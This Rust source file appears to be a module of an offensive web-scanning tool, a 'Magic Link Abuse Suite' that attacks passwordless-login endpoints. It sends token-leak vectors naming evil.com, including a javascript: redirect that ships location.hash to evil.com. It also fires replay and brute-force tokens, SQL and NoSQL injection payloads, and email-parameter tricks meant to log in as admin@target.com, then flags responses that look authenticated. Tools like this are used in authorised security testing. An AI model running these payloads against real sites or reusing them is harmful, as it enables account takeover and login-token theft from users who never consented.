use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const MAGIC_LINK_ENDPOINTS: &[(&str, &str)] = &[
    ("Request magic link", "/auth/magic/request"),
    ("Verify magic link", "/auth/magic/verify"),
    ("Magic link callback", "/auth/magic/callback"),
    ("Auth status", "/auth/status"),
    ("Token exchange", "/auth/token"),
    ("Session", "/api/session"),
    ("Logout", "/auth/logout"),
    ("Refresh", "/auth/refresh"),
];

const TOKEN_LEAK_VECTORS: &[(&str, &str)] = &[
    ("Referer header leak", "Referer: https://evil.com/"),
    ("Referer with token", "Referer: https://evil.com/?token=leaked"),
    ("Open redirect + token", "?redirect_uri=https://evil.com&token=test"),
    ("Token in URL fragment", "#token=magic_token_value"),
    ("Token in URL query", "?token=magic_token_value"),
    ("Token via meta refresh", "?redirect=javascript:location='https://evil.com/'+location.hash"),
    ("Token via postMessage", "?target_origin=https://evil.com"),
    ("Token via CORS", "Origin: https://evil.com"),
    ("Token via preload", "Link: <https://evil.com>; rel=preload; as=fetch"),
    ("Token via DNS rebinding", "Host: evil.com"),
];

const REPLAY_PAYLOADS: &[(&str, &str, &str)] = &[
    ("Token replay — direct", "GET", "token=magic_token_value"),
    ("Token replay — expired", "GET", "token=expired_magic_token"),
    ("Token replay — used", "GET", "token=already_used_token"),
    ("Cross-user token", "GET", "token=other_user_token&email=admin@target.com"),
    ("Token brute — short", "GET", "token=AAAA"),
    ("Token brute — numeric", "GET", "token=000001"),
    ("Token brute — pattern", "GET", "token=test123"),
    ("Email parameter injection", "POST", "email=admin@target.com&token=any"),
    ("Email change mid-flow", "POST", "email=attacker@evil.com&token=valid_token"),
    ("Token concatenation", "GET", "token=valid_token%20OR%201=1"),
    ("Token SQLi", "GET", "token=' OR '1'='1"),
    ("Token NoSQLi", "POST", r#"{"token":{"$ne":null}}"#),
    ("Token type confusion", "POST", r#"{"token":true,"email":"admin@target.com"}"#),
    ("Mass token request", "POST", "email=victim@target.com&email=admin@target.com"),
    ("Token in header", "GET", "X-Magic-Token: stolen_token"),
    ("Token in cookie", "GET", "Cookie: magic_token=stolen_token"),
];

pub async fn abuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Magic Link Abuse Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/3] Magic link endpoint discovery...", "[*]".cyan().bold());
    let mut found = Vec::new();
    for (name, path) in MAGIC_LINK_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200 || status == 302;
                let tag = if accessible {
                    "ACCESSIBLE".green().bold().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} {:35} {}", "*".cyan(), name, path, tag);
                if accessible {
                    found.push((*name, body.chars().take(200).collect::<String>()));
                }
            }
            Err(_) => {
                println!("  {} {:25} {:35} error", "*".red(), name, path);
            }
        }
    }

    println!("\n{} [2/3] Token leakage vectors...", "[*]".cyan().bold());
    let mut leak_results = Vec::new();
    for (name, header_value) in TOKEN_LEAK_VECTORS {
        let test_url = format!("{}/auth/magic/verify", base);
        let mut req = client.get(&test_url);

        if header_value.starts_with("Referer:") {
            req = req.header("Referer", &header_value[8..]);
        } else if header_value.starts_with("Origin:") {
            req = req.header("Origin", &header_value[7..]);
        } else if header_value.starts_with("Link:") {
            req = req.header("Link", &header_value[6..]);
        } else if header_value.starts_with("Host:") {
            req = req.header("Host", header_value[5..].trim());
        } else if header_value.starts_with("?") || header_value.starts_with("#") {
            // URL param/fragment — check if token appears in redirect
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let location = resp.headers().get("location")
                    .map(|v| v.to_str().unwrap_or(""))
                    .unwrap_or("")
                    .to_string();
                let body = resp.text().await.unwrap_or_default();
                let leaks_token = location.contains("token=") || body.contains("token=")
                    || location.contains("evil.com") || body.contains("evil.com");
                let tag = if leaks_token {
                    "TOKEN LEAK".red().bold().to_string()
                } else if status == 302 {
                    "redirect".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} [{:02}] {:35} status={} {}", "*".cyan(), leak_results.len() + 1, name, status, tag);
                if leaks_token {
                    if !location.is_empty() {
                        println!("    {} Location: {}", ">".red().bold(), location);
                    }
                    leak_results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:35} error", "*".red(), leak_results.len() + 1, name);
            }
        }
    }

    println!("\n{} [3/3] Token replay & cross-user auth...", "[*]".cyan().bold());
    let mut replay_results = Vec::new();
    for (name, method, body) in REPLAY_PAYLOADS {
        let verify_url = format!("{}/auth/magic/verify", base);
        let req = if *method == "POST" {
            client.post(&verify_url)
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(body.to_string())
        } else {
            let url_with_param = format!("{}?{}", verify_url, body);
            client.get(&url_with_param)
        };

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let set_cookie = resp.headers().get("set-cookie").is_some();
                let resp_body = resp.text().await.unwrap_or_default();
                let has_auth = resp_body.contains("authenticated") || resp_body.contains("session")
                    || resp_body.contains("token") || resp_body.contains("user");
                let has_admin = resp_body.contains("admin") || resp_body.contains("role");
                let has_error = resp_body.contains("error") || resp_body.contains("invalid") || resp_body.contains("expired");

                let tag = if (has_auth || has_admin) && !has_error {
                    "AUTHENTICATED".red().bold().to_string()
                } else if set_cookie && status == 200 {
                    "session set".yellow().to_string()
                } else if has_error {
                    "rejected".green().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:35} status={} {}",
                    "*".cyan(),
                    replay_results.len() + 1,
                    name,
                    status,
                    tag
                );

                if (has_auth || has_admin) && !has_error {
                    println!("    {} {}", ">".red().bold(), resp_body.chars().take(200).collect::<String>());
                    replay_results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:35} error", "*".red(), replay_results.len() + 1, name);
            }
        }
    }

    println!(
        "\n{} {} endpoints found, {} token leaks, {} replay/cross-user auth succeeded",
        "[*]".cyan().bold(),
        found.len(),
        leak_results.len(),
        replay_results.len()
    );

    if !leak_results.is_empty() {
        println!("{} [HIGH] Token leakage via Referer/redirect — tokens can be stolen!", "[!]".red().bold());
    }
    if !replay_results.is_empty() {
        let cross_user = replay_results.iter().any(|n| n.contains("Cross") || n.contains("email"));
        let brute = replay_results.iter().any(|n| n.contains("brute") || n.contains("Brute"));
        let sqli = replay_results.iter().any(|n| n.contains("SQL") || n.contains("NoSQL"));
        if cross_user {
            println!("{} [CRITICAL] Cross-user authentication — login as any user!", "[!]".red().bold());
        }
        if brute {
            println!("{} [HIGH] Token brute force — predictable/short tokens!", "[!]".red().bold());
        }
        if sqli {
            println!("{} [CRITICAL] SQL/NoSQL injection in token validation!", "[!]".red().bold());
        }
    }

    Ok(())
}
